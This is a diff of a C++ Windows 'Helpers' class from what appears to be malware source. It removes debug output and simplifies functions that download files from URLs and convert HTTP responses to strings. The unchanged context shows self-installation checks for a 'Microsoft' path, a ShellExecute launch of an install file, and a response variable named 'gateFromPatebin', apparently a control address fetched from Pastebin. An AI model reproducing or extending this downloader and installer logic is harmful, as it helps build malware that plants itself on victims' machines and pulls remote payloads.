@@ -1,4 +1,4 @@
-#include <windows.h>
+
 #include <iostream>
 #include <fstream>
 #include <LM.h>
@@ -203,9 +203,6 @@ class Helpers
 			{
 				size_t found = ExePath().find("Microsoft");
 				if (found != std::string::npos) {
-					std::cout << found;
-					std::cout << "\n";
-					std::cout << ExePath();
 					return "installed";
 				}
 				else {
@@ -218,7 +215,6 @@ class Helpers
 					else {
 						std::cout << "Installed " << std::endl;
 						std::string rebootString = "  /C  start " + installFile;
-						std::cout << rebootString;
 						//system(rebootString.c_str());
 						ShellExecute(
 							NULL,
@@ -298,9 +294,12 @@ class Helpers
 		}
 
 		static std::string downloadFile(std::string url, std::string file) {
+			HRESULT hr = URLDownloadToFile(NULL, _T(url.c_str()), _T(file.c_str()), 0, NULL);
+			/*
 			const char* strUrl = url.c_str();
 			const char* strFile = file.c_str(); // I had been testing with these, not currently using them
 			HRESULT hr = URLDownloadToFile(NULL, url.c_str(), file.c_str(), 0, NULL);
+			*/
 			if (FAILED(hr)) {
 				return "failed";
 			}
@@ -359,18 +358,21 @@ class Helpers
 			std::cin.sync();
 			std::cin.ignore();
 		}
-
+		
 		static std::string responseToString(http::Response response) {
+			
+			return std::string(response.body.begin(), response.body.end());
+			
+			/*
 			char* gateFromPatebin = (char*)malloc(response.body.size() + 1);
 			memcpy(gateFromPatebin, response.body.data(), response.body.size());
 			gateFromPatebin[response.body.size()] = '\0';
 			std::string responseFromGateString = gateFromPatebin;
 			free(gateFromPatebin);
 			return responseFromGateString;
+			*/
 		}
-
-
-
+		
 };
 
 
